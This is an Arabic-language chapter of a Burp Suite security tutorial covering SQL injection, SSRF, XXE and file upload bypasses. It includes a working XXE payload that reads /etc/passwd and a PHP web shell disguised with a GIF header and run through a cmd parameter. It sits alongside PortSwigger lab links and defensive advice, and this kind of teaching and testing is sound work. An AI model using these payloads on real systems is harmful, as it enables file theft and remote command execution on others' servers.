# 12. تطبيق Burp Suite على أشهر ثغرات الويب (Vulnerability Testing)

> 🌐 **اللغة / Language:** [English Version (`en/12-vulnerabilities-with-burp.md`)](../en/12-vulnerabilities-with-burp.md)

---

## 🎯 الهدف من الفصل

تطبيق أدوات Burp Suite المختلفة كمنظومة عمل هجومية متكاملة لاكتشاف واستغلال أخطر تصنيفات ثغرات تطبيقات الويب طبقاً لمعايير **OWASP Top 10**، بما في ذلك: **XSS**، و **SQL Injection**، و **SSRF**، و **XXE Injection**، وتجاوز قيود رفع الملفات (**File Upload Bypasses**)، وثغرات إلغاء التسلسل غير الآمن (**Insecure Deserialization**).

---

## 🔍 كيف تعمل الأداة (Technical Explanation)

### 1. حقن الأوامر و SQL Injection (في Repeater):
تحدث ثغرات SQLi عندما تدمج مدخلات المستخدم مباشرة داخل استعلام قاعدة البيانات. يتيح Repeater اختبار كسر الاستعلام تدريجياً:
* التحقق من كسر الاستعلام عبر علامات الاقتباس الفردية `'` ومراقبة رسائل الأخطاء أو أكواد الحالة `500`.
* استخدام استعلامات `UNION SELECT` لاستخراج البيانات.
* استخدام هجمات التأخير الزمني (Time-based Blind SQLi) مثل `pg_sleep(10)` ومراقبة عمود زمن الاستجابة في Repeater.

### 2. ثغرات التزوير في طلبات الخادم (SSRF & Collaborator):
تحدث عندما يجبر المهاجم السيرفر على جلب مورد خارجي أو الاتصال بخدمة داخلية محجوبة (مثل خوادم الـ Metadata في السحاب `169.254.169.254`):
* يتم رصد الـ SSRF الأعمى (Blind SSRF) فوراً عبر حقن رابط **Burp Collaborator** في الحقول التي تقبل روابط (Webhooks, Avatar URLs, PDF Generators).

### 3. ثغرات الكيانات الخارجية في XML (XXE Injection):
تستغل معالجات الـ XML القديمة التي تسمح بتعريف كيانات خارجية مخصصة داخل ترويسة الـ DTD:
* قراءة الملفات الحساسة (`/etc/passwd` أو `win.ini`).
* تنفيذ هجمات Blind XXE عبر استدعاء ملف DTD خارجي مستضاف على خادم Collaborator لاستخراج البيانات خارج النطاق (OOB Exfiltration).

### 4. تجاوز قيود رفع الملفات (File Upload Bypasses):
تسمح أداة Repeater بتفكيك طلب رفع الملف وتجاوز كافة قيود الفحص التي يفرضها المتصفح أو السيرفر غير الحصين:
* تزوير ترويسة نوع المحتوى (`Content-Type: image/jpeg` بدلاً من `application/x-php`).
* استخدام حيل الامتدادات البديلة (`.php5`, `.phtml`, `.phar`) أو الامتداد المزدوج (`shell.php.jpg`).
* إضافة التوقيع السحري للملف (Magic Bytes مثل `GIF89a`) في بداية الملف التنفيذي لخداع دوال فحص الصور.

---

## 🛠️ التطبيق العملي (Step-by-Step)

### التمرين 1: استغلال ثغرة XXE لقراءة ملف النظام `/etc/passwd`
1. التقط طلباً بصيغة XML في المتصفح (مثلاً طلب فحص المخزون `POST /product/stock`) وأرسله إلى **Repeater** (`Ctrl + R`).
2. عيّن كود الـ XML الأصلي في جسم الطلب:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <stockCheck><productId>381</productId><storeId>1</storeId></stockCheck>
   ```
3. احقن تعريف كيان خارجي خبيث (DOCTYPE Entity) أعلى الطلب وقم باستدعائه داخل الـ `productId`:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
   ```
4. اضغط **Send**؛ ستشاهد محتويات ملف النظام `/etc/passwd` معروضة مباشرة داخل استجابة الخادم.

### التمرين 2: تجاوز فحص نوع الملف ورفع Web Shell
1. التقط طلب رفع صورة رمزية (`POST /my-account/avatar`) وأرسله إلى **Repeater**.
2. عدل اسم الملف في ترويسة `Content-Disposition` من `avatar.jpg` إلى `shell.php`.
3. عدل ترويسة `Content-Type` الخاصة بالملف لتظل: `Content-Type: image/jpeg`.
4. استبدل محتوى الصورة بكود PHP تنفيذي مع ترويسة GIF سحرية:
   ```http
   GIF89a;
   <?php echo system($_GET['cmd']); ?>
   ```
5. أرسل الطلب، فإذا قبل السيرفر الملف بنجاح، يمكنك التوجه لمسار رفع الصورة وتشغيل الأوامر عبر: `/files/avatars/shell.php?cmd=whoami`.

---

## 🧪 Lab مقترح

* **المعمل التطبيقي:** [PortSwigger Academy: Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
  * تدرب على استغلال ثغرة XXE عبر Repeater لحقن كيان خارجي وقراءة ملفات النظام الحساسة.

---

## ⚔️ منظور المهاجم (Attacker) vs. 🛡️ منظور المدافع (Defender)

* **⚔️ منظور المهاجم:**
  * يوفر Repeater للمهاجم بيئة مثالية لعمل "التعديل الجراحي" (Surgical Tampering)، حيث يقوم باختبار افتراضات المبرمج وتجاوز الفلاتر خطوة بخطوة.
* **🛡️ منظور المدافع:**
  * الدفاع ضد هذه الثغرات يتطلب: استخدام استعلامات مجهزة (Parameterized Queries) ضد SQLi، وتعطيل معالجة الكيانات الخارجية (`disable-dtd`) ضد XXE، وتغيير أسماء وامتدادات الملفات المرفوعة وتخزينها في خوادم سحابية منفصلة (S3 Buckets).

---

## ❌ أخطاء شائعة للمبتدئين

> [!WARNING]
> 1. **نسيان عمل URL-encode لحمولات XSS في باراميترات الـ GET:** كتابة أحرف مثل `+` أو مسافات في مسار الرابط دون ترميز يؤدي إلى تشويه المعاملات في السيرفر وفشل الهجوم.
> 2. **اختبار XXE على خوادم حديثة ترفض تعريف DTD:** إضاعة الوقت في محاولة قراءة الملفات مباشرة عندما يكون السيرفر يمنع الردود النصية، بدلاً من التحول إلى هجوم Blind XXE باستخدام Burp Collaborator.
> 3. **تجاهل فحص ترويسات Content-Type و Content-Length:** عند تعديل طلبات رفع الملفات يدوياً، قد يؤدي حذف حدود الـ Multipart (`boundary markers`) إلى فشل السيرفر في تحليل الطلب تماماً.

---

## 📚 مراجع

1. [OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/)
2. [PortSwigger Web Security Academy - Vulnerability Topics](https://portswigger.net/web-security)
3. [PayloadsAllTheThings GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

| [← السابق: 11. إضافات Burp ومنصة Montoya](./11-extensions.md) | [الفهرس](../README.md#🗂️-فهرس-الفصول-النسخة-العربية---ar) | [التالي: 13. اختبار المصادقة والجلسات و JWT و OAuth →](./13-auth-session-jwt-oauth.md) |
